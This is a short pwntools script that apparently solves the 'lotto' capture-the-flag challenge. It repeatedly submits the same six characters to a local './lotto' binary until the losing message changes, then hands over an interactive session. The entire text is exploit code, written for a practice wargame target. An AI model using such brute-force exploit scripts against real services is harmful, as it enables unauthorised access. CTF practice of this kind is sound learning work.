from pwn import *

context(log_level='debug')

p = process('./lotto')
# p = remote('')
# p.sendline('1')
p.recv(timeout=30)
p.sendline('111111')
i=0
for x in range(1000):
	data = p.recv(timeout=30)
	if data !='Lotto Start!\nbad luck...\n- Select Menu -\n1. Play Lotto\n2. Help\n3. Exit\n' and i>0:
		print data
		break
	p.sendline('1')
	p.recv(timeout=30)
	p.sendline('111111')
	i+=1
p.interactive()